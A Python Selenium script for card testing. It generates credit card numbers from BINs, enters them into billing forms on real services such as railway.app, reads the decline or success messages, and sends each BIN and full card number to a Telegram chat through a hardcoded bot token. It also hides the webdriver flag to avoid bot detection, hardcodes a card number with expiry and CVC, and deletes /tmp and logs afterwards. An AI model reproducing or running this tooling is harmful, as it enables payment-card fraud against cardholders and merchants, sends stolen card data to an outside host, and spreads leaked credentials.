import cnf_bvb
# import mod_vpn
import mod_driver
import emoji
from pyvirtualdisplay import Display
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options as options
from selenium.webdriver.firefox.options import Options as Firefox_Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random,datetime,string , os ,time ,subprocess , sys , requests ,re , socket
from selenium.webdriver import ActionChains
import json
import pickle
import bin00
import t00l_
import mod_sql
mod_sql.check_if_exist()

###########global urls_BVB
# urls_BVB=cnf_bvb.random_url
#####################################
# urls_BVB="https://wild-beauty.weebly.com/about.html"
urls_BVB="https://pedantic-wescoff-chat-covid19.netlify.app/index.html"
# random_display_chose=cnf_bvb.random_display_chose
# width=cnf_bvb.width
# height=cnf_bvb.height

user_agent = cnf_bvb.user_agent
sys_use_agent=re.findall('\(.*?\)',user_agent)[0]


########################################################################################################################################

def send_msg(text):
	hostt=socket.getfqdn()
	mmssg= " [ "+hostt+" ]"+text
	token = "5104042226:AAEc9_KVrQS17fpPlQedqI7w6mHAQRr8kj8"
	chat_id = "-1001790110973"
	url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + mmssg 
	results = requests.get(url_req)
	# print(results.json())


# def send_msg(text):
# 	hostt=socket.getfqdn()
# 	mmssg= " [ "+hostt+" ]"+text
# 	token = "2137513961:AAGENlwIUQnfvbKZX64-fZ72R_oStto8oFo"
# 	chat_id = "-643828126"
# 	url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + mmssg 
# 	results = requests.get(url_req)
# 	print(results.json())


def clean_up():
	os.system("rm -rf /tmp/*")
	os.system("rm geckodriver.log")
	os.system("rm -rf rm -rf __pycache__/")


def check_the_message(msg_replay,driver):
	if "Your card number is incorrect" in msg_replay:
		print("Your card number is incorrect : (")
		go_billing(driver)
	


	if "success" in msg_replay:
		print("successful : )"+msg_replay)
		input('successful ')

	#Your card was declined
	if "Your card was declined" in msg_replay:
		print(msg_replay)
		go_billing(driver)






def card_fonction(driver):

	print("CARD INFOS  ...... ",end='',flush=True)

	try:

		NAME_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'name')))
		NAME_BUTTON.send_keys("Jhon whik")
		# input("lets play")
		time.sleep(1)
		CARD_NUMBER_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'number')))
		CARD_NUMBER_BUTTON.send_keys("4137602328178547")#4016580721408602 4137602328178547
		# input("lets play")
		time.sleep(1)
		EXP_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'exp_date')))
		EXP_BUTTON.send_keys("05/22")
		time.sleep(1)
		CCV_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.ID, 'cvc')))
		CCV_BUTTON.send_keys("052",Keys.ENTER)
		# CCV_BUTTON.send_keys("052")
		time.sleep(3)

		# input("lets play")
		try:

			SUCCESS_MSG_BUTTON=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, 'stripe-success')))
			
			msg_replay=SUCCESS_MSG_BUTTON.text
			# print(msg_replay)
		except Exception as e:
			pass

		# input("SUCCESS_MSG_BUTTON")


		try:
			ERROR_MSG_BUTTON=WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, 'stripe-error')))
			time.sleep(5)
			msg_replay=ERROR_MSG_BUTTON.text
			# print(msg_replay)
		except Exception as e:
			pass

		check_the_message(msg_replay,driver)


	except Exception as e:
		print(e)

def end_success(driver):

	try:
		print("Close Firefox ...... ",end='')
		driver.quit()

		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
		time.sleep(1)
	except:
		pass
	try:
		print("Close Display ...... ",end='')
		display.stop()
		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
	except:
		pass
	init_fire()
	starting_tasks()
############################################################################################

def go_billing(driver):

	try:
		driver.get("https://testinoy.helpjuice.com/admin/billing")
		#edit-card
		# CSS_SELECTOR
		EDIT_CARD_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.edit-card')))
		EDIT_CARD_BUTTON.click()
		# input("lets play")
		time.sleep(5)
		# input("get id")
		#######################
		############################
		card_fonction(driver)

	except Exception as e:
		print(e) 










def fill_form_one(driver):
	print("fill_form_one")


	usr_ar=user_information()
	# print(usr_ar)
	caed_ar=bin_operation()

	# print(url_get_text)
	iframes = driver.find_elements_by_xpath("//iframe")
	lin=len(iframes)
	print("IFRAME LENGHT",str(lin))
	if lin ==1:
		# input("")
		time.sleep(4)
		iframe = driver.find_elements_by_tag_name('iframe')[0]
		# driver.switch_to.frame(iframe)
		time.sleep(1)
		driver.switch_to.frame(iframe)
		time.sleep(1)
		EMAIL_CASE=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/form/div/div[2]/span[1]/span[2]/div/div[2]/span/input')))
		print("oook")

	else:
		driver.switch_to.frame(2)
		EMAIL_CASE=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '//*[@id="root"]/form/div/div[2]/span[1]/span[2]/div/div[2]/span/input')))

	
	time.sleep(2)
	# for index, iframe in enumerate(iframes):
	# 		print(index)
	# 		#print(iframes[index])
	# 		driver.switch_to.frame(index)
	# 		time.sleep(2)
	# 		try:
	# 			EMAIL_CASE=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/form/div/div[2]')))
	# 			print("oook")
	# 			driver.switch_to.parent_frame()
	# 			time.sleep(1)
	# 			break
	# 		except Exception as e:
	# 			print('rrrrrr')
	# 			driver.switch_to.parent_frame()
	# 			time.sleep(1)
	#/html/body/div/form/div/div[2]/span[1]/span[2]/div/div[2]/span/input
	print("oook")
	# EMAIL_CASE.send_keys("4000179977987837")
	# time.sleep(2)
	# EMAIL_CASE.send_keys("0723")
	emm=usr_ar[7]
	print(caed_ar[0]+usr_ar[7])
	print(usr_ar[6])
	
	# EMAIL_CASE.send_keys(Keys.CONTROL+'a' )
	# EMAIL_CASE.send_keys(Keys.BACKSPACE )
	EMAIL_CASE.send_keys(caed_ar[0]+caed_ar[1]+caed_ar[2]+usr_ar[6])
	time.sleep(2)
	EMAIL_CASE.send_keys(Keys.ENTER)
	# input('')


	print("number card")
	driver.switch_to.default_content()
	time.sleep(3)
	# input("5")
	#//*[@id="encryptedExpiryDate"]
	# driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[1])
	# time.sleep(1)
	# CARD_EXP_DATE_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedExpiryDate"]')))

	# time.sleep(1)
	# CARD_EXP_DATE_CASE.send_keys(caed_ar[1])
	# time.sleep(1)
	# # CARD_EXP_DATE_CASE.send_keys(Keys.TAB*2, caed_ar[2])
	# driver.switch_to.default_content()
	# print("CARD_EXP_DATE_CASE")
	# # input("5")
	# # time.sleep(1)
	# driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[2])
	# time.sleep(1)
	# CARD_CVV_CASE=WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedSecurityCode"]')))
	# CARD_CVV_CASE.click()
	# # time.sleep(2)
	# CARD_CVV_CASE.send_keys(caed_ar[2])
	# # time.sleep(1)
	# driver.switch_to.default_content()
	# time.sleep(1)
	# # CARD_RD_CASE.send_keys(Keys.ENTER)
	# #button -blue -form -full
	# START_BUTTON=WebDriverWait(driver, 11).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/form/button')))
	# START_BUTTON.click()
	# time.sleep(5)


	# #
	print(caed_ar)
	
	check_general_form_one(driver,caed_ar)
	# check_general_form2(driver,caed_ar)

	# input("4")



#############################--------------------------------------------------------------------------

def fill_form_tow(driver,url_get_text):

	print("fill_form_tow ...... ",end='',flush=True)
	caed_ar=bin_operation()
	# input("5")
	time.sleep(1)
	#//*[@id="encryptedExpiryDate"]
	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[0])
	time.sleep(1)
	CARD_RD_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedCardNumber"]')))
	CARD_RD_CASE.click()
	CARD_RD_CASE.send_keys(Keys.CONTROL+'a' )
	CARD_RD_CASE.send_keys(Keys.BACKSPACE )
	CARD_RD_CASE.send_keys(caed_ar[0])
	# CARD_RD_CASE.send_keys(Keys.TAB*2,caed_ar[1])
	# CARD_RD_CASE.send_keys(Keys.TAB*2,caed_ar[2])
	# #
	print("number card")
	driver.switch_to.default_content()
	time.sleep(1)
	# input("5")
	#//*[@id="encryptedExpiryDate"]
	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[1])
	time.sleep(1)
	CARD_EXP_DATE_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedExpiryDate"]')))

	time.sleep(1)
	CARD_EXP_DATE_CASE.click()
	CARD_EXP_DATE_CASE.send_keys(Keys.CONTROL+'a' )
	CARD_EXP_DATE_CASE.send_keys(Keys.BACKSPACE )
	CARD_EXP_DATE_CASE.send_keys(caed_ar[1])
	time.sleep(1)
	# CARD_EXP_DATE_CASE.send_keys(Keys.TAB*2, caed_ar[2])
	driver.switch_to.default_content()
	print("CARD_EXP_DATE_CASE")
	# input("5")
	time.sleep(1)
	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[2])
	time.sleep(1)
	CARD_CVV_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedSecurityCode"]')))
	CARD_CVV_CASE.click()
	# time.sleep(2)
	CARD_CVV_CASE.send_keys(caed_ar[2])
	driver.switch_to.default_content()
	time.sleep(1)
	#
	CONTINUE_BUTTON=WebDriverWait(driver,10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div/div[2]/div[2]/div/div[2]/div[1]/form/div[2]/button')))
	CONTINUE_BUTTON.click()
	time.sleep(6)
	check_general_form2(driver,caed_ar)

	# input("date expiration")

def check_general_form_one(driver,caed_ar):
	#messzge telegram
	msg_test_log="U N D E F I N E D"
	card_number=caed_ar[0]
	extract_bin=" [ "+card_number[0:8]+" ] "
	# input("T 6")
	# /html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/div/svg
	# /html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/div/svg
	try:
		# URL_BUTTON=WebDriverWait(driver, 7).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div/main/div/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/div')))
		URL_BUTTON=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div/main/div/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/span')))

		# input("T 3")
		# input("")
		# /html/body/div/div/main/div/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/span
		url_get_text=URL_BUTTON.text
		print(url_get_text)
		telegram_msg=" "+url_get_text+extract_bin+card_number
		send_msg(telegram_msg)

		add_to_last_bin()
		driver.get("https://railway.app/account/billing")
		fill_form_one(driver)
	except Exception as e:
		print("Correct Card")
		# input("T 1")
	try:
		
		print("CHECK THE PAGE F1 ...... ",end='',flush=True)
		# l /html/body/div/div/main/div/div[2]/main/section/div/section/div[3]/div/div
		# URL_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/div[3]/div/div')))
		URL_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div/main/div/div[2]/main/section/div/section/div[3]/div/div')))
		# input("T 1")
		url_get_text=URL_BUTTON.text
		msg_test_log=url_get_text
		print(url_get_text)

		# input('')
		if "Please use a different card," in url_get_text:
			add_to_last_bin()
			telegram_msg=" "+msg_test_log+extract_bin+card_number
			send_msg(telegram_msg)
			#fill_form_tow(driver,url_get_text)

		#form__input -feedback -error -m-half
		if "Your card does not support this type of purchase" in url_get_text:
			add_to_last_bin()
			telegram_msg=" "+msg_test_log+extract_bin+card_number
			send_msg(telegram_msg)
			#fill_form_tow(driver,url_get_text)
		if "incorrect" in url_get_text:
			add_to_last_bin()
			telegram_msg=" "+msg_test_log+extract_bin+card_number
			send_msg(telegram_msg)
			#fill_form_tow(driver,url_get_text)
		if "declined" in url_get_text:
			add_to_last_bin()
			telegram_msg=" "+msg_test_log+extract_bin+card_number
			send_msg(telegram_msg)
			#fill_form_tow(driver,url_get_text)

	except Exception as e:
		print(str(e))
		add_to_last_bin()
	# input("T 2")
	driver.get("https://railway.app/account/billing")
	# input('')
	fill_form_one(driver)
	# try:
	# 	print("CHECK THE PAGE 3 F1 ...... ",end='',flush=True)
	# 	URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
	# 	url_get_text=URL_BUTTON.text

	# 	if "chosen your Stan plan" in url_get_text:
	# 		telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
	# 		add_to_last_bin()
	# 		# msg_text="SUCCESS :white_check_mark ["+caed_ar[0]+" ]"
	# 		save_successed_bin(caed_ar[0])
	# 		send_msg(telegram_msg)
	# 		end_success(driver)
	# 		# fill_form_tow(driver,url_get_text)

	# 	if "try again." in url_get_text:
	# 		# msg_text="INCORECT :interrobang:  :interrobang   ["+caed_ar[0]+" ]"
	# 		telegram_msg="INCORECT :interrobang:  "+extract_bin+card_number
	# 		add_to_last_bin()
	# 		send_msg(telegram_msg)

	# 		fill_form_tow(driver,url_get_text)		
	# 	#form__input -feedback -error -m-half
	# except Exception as e:
	# 	print(e)



#form__input -feedback -error -m-half 52298708 52297399
#----------------------------------------------------------------------------------------------------

def check_general_form2(driver,caed_ar):

	card_number=caed_ar[0]
	extract_bin=" [ "+card_number[0:6]+" ] "


	try:
		print("CHECK THE PAGE 2 F2 ...... ",end='',flush=True)
		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
		url_get_text=URL_BUTTON.text
		if "Please use a different card," in url_get_text:
			telegram_msg="DECLINE :interrobang: "+extract_bin+card_number
			add_to_last_bin()
			send_msg(telegram_msg)
			fill_form_tow(driver,url_get_text)

		if "try again" in url_get_text:
			telegram_msg="INCORECT :interrobang:  "+extract_bin+card_number
			add_to_last_bin()
			send_msg(telegram_msg)

			fill_form_tow(driver,url_get_text)		
	except Exception as e:
		print(e)


	try:
		print("CHECK THE PAGE 3 F2 ...... ",end='',flush=True)
		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
		url_get_text=URL_BUTTON.text
		if "chosen your Stan plan" in url_get_text:
			telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
			add_to_last_bin()
			send_msg(telegram_msg)
			end_success(driver)

		if "try again" in url_get_text:
			telegram_msg="INCORECT   :interrobang:  "+extract_bin+card_number
			add_to_last_bin()
			send_msg(telegram_msg)

			fill_form_tow(driver,url_get_text)		
	except Exception as e:
		print(e)




def check_general(driver):
	# caed_ar=[]
	try:	
		print("CHECK THE PAGE G...... ",end='',flush=True)
		fill_form_one(driver)
		# URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.modal__title')))
		# url_get_text=URL_BUTTON.text
		# # print(url_get_text)
		# if "30 day free trial" in url_get_text:
		# 	fill_form_one(driver,url_get_text)
		#form__input -feedback -error -m-half
	except Exception as e:
		print(e)

	













def lets_play(serv,ops):

	try:
		print("OPEN DISPLAY  WEB-SITE ...... ",end='',flush=True)
		# 
		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))

	except Exception as error:
		print(str(error))
		exit(0)
	
	print("OPEN AND VISITE WEB-SITE ...... ",end='',flush=True)
	time.sleep(1)
	try:

		driver = webdriver.Firefox(service=serv, options=ops)
		driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
		# driver.set_page_load_timeout(79)
		driver.set_page_load_timeout(79)

		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
		driver.get("https://railway.app/account/billing")
		# input('')
		
		# EMAIL_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.form__group')))
		# EMAIL_BUTTON.send_keys(user_email)
		# EMAIL_BUTTON.send_keys(Keys.TAB,Keys.ENTER)


		time.sleep(1)
		# CONTINUE_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.button.-blue.-form.-full')))
		# # CONTINUE_BUTTON.click()
		# CONTINUE_BUTTON.send_keys(Keys.ENTER)
		print("Dashboard on home")
		# caed_ar=[]
		check_general(driver)
		#modal__title
		# input("web ok")
		end_success(driver)

		# go_billing(driver)
	except Exception as error:
		print(str(error))

	print("CHECK THE getLink_button WEB-SITE ...... ",end='')


	try:
		print("Close Firefox ...... ",end='')
		driver.quit()

		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
		time.sleep(1)
	except:
		pass
	try:
		print("Close Display ...... ",end='')
		display.stop()
		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
	except:
		pass


#####################################

def init_fire():
	print("############################################################")
	print("INIT TASKS ..... ", end='')
	try:
		os.system("ps aux | grep -i firefox | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
		#
		os.system("ps aux | grep -i openvpn | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
		os.system("ps aux | grep -i Xephyr | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
		os.system("ps aux | grep -i geckodriver13 | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
		os.system("ps aux | grep -i Xvfb | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
		os.system("rm -rf /tmp/*") 
		time.sleep(5)
		print(" OK !!!")
		#os.system("ps aux | grep -i firefox | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
		#print("############################################################")
	except:
		print(" NO  some_Error init_fire")
###################################################################################################


def stage_1():
	try:
		#print (urls_BVB)
		os.system("rm -rf /tmp/*") 
		os.system("clear && sleep 1") 
		print ( "-------------------------------------------------------")
		print(emoji.emojize("Website    : "+urls_BVB+' :check_mark_button: :alien:'))
		# print(emoji.emojize("Resolution : "+random_display_chose+' :check_mark_button: :alien:'))
		#####TO DO PRINT ONLY THE SYSTEM
		#print(width+"x"+height)
		print("System     : "+sys_use_agent)
		print ( "-------------------------------------------------------")

	except Exception as error:
		print (str(error))




#################################"MAIN STARTING"##############################

def starting_tasks():
	width ,height=cnf_bvb.resolution_func()

	moz_wid="--width="+str(width)
	moz_hig="--height="+str(height)

######################USER AGENT ###################################################

	try:
		# display = Display(visible=1, size=(width,height)).start()
		stage_1()### CLEAR
		# os.system("curl -sx socks5://127.0.0.1:9050 ifconfig.co | grep -oP '(?<=Your IP</span>: ).*(?=</span>)'")
		# mod_vpn.fnc_vpn ()
		# mod_vpn.renew_connection()
		serv,ops=mod_driver.build_driver(width ,height)

		# os.system("curl -sx socks5://127.0.0.1:9050 ifconfig.co | grep -oP '(?<=Your IP</span>: ).*(?=</span>)'")
		#build_driver()###### BUILDING DRIVER
		lets_play(serv,ops)
		display.stop()
		clean_up()

	except Exception as error:
		print (str(error))





def user_information():
	arry_user_all_info=[]

	arry_usr_info=t00l_.generate_name_add()
	print(arry_usr_info)
	full_name=arry_usr_info[1].split(" ")
	# print(full_name)
	date_off_birthday=arry_usr_info[2].split("-")


	password =   arry_usr_info[0]
	first_name = full_name[0]
	last_name =  full_name[1]
	dd_birth =   date_off_birthday[0]
	mm_birth =   date_off_birthday[1]
	yy_birth =   date_off_birthday[2]
	post_code = arry_usr_info[3]
	email_usr = arry_usr_info[4]
	arry_user_all_info.extend((password,first_name,last_name,dd_birth,mm_birth,yy_birth,post_code,email_usr))
	print(arry_user_all_info)
	# for i in arry_user_all_info:
	# 	print(i)
	return arry_user_all_info #password,first_name,last_name,dd_birth,mm_birth,yy_birth,post_code








def read_the_last_bin():
	# file_bin=open('last_bin' ,'w')
	with open("last_bin") as file_bin:
		lines=file_bin.readlines()
	v_last_bin=lines[0].replace("\n","")
	return v_last_bin

def generate_card_from_bin(bin_number):
	arry_card_bin_info=[]
	# print("GENERATE CARD  OF BIN [ "+bin_number+" ]            ",end='',flush=True)
	print("GENERATE CARD  OF BIN  ",end='',flush=True)
	time.sleep(1)
	bin_all_card=bin00.generator_bin(bin_number,1)
	# print(bin_all_card)
	arry_bin=bin_all_card[0].split("#")
	card_num=arry_bin[0]
	card_date=arry_bin[1]
	card_date=card_date.replace('|','/')
	card_ccv=arry_bin[2]
	arry_card_bin_info.extend((card_num,card_date,card_ccv))
	print(arry_card_bin_info)
	return arry_card_bin_info





def bin_operation():
	print("-------------------------------------------------------------------------------------")
	print("GET THE LAST BIN         ",end='',flush=True)
	arry_card_all_info=[]
	the_last_bin=read_the_last_bin()
	time.sleep(1)
	print("LAST BIN : [  "+the_last_bin+"  ]")
	arry_card_bin_info=generate_card_from_bin(the_last_bin)
	# arry_card_all_info.extend((card_num,card_date,card_ccv))
	# print(card_num,card_date,card_ccv)
	# print(arry_card_bin_info)
	return arry_card_bin_info



def add_to_last_bin():
	l_bin=read_the_last_bin()
	print(l_bin)
	new_bin=int(l_bin)+1
	binani=str(new_bin)
	#################
	with open("last_bin","w") as file_bin:
		file_bin.write(binani)
	mod_sql.update_to_db(binani)

def save_successed_bin(card_numer):
	# l_bin=read_the_last_bin()
	print(card_numer)
	# new_bin=int(l_bin)+1
	# binani=str(new_bin)
	#################
	with open("succed_bin","a") as file_bin:
		file_bin.write(card_numer+"\n")










os.system("rm -rf /tmp/*")


# starting_tasks()
# clean_up()
def begaining_loop():
	for i in range(1000):
		bin_operation()
		user_information()
		add_to_last_bin()





# begaining_loop()
starting_tasks()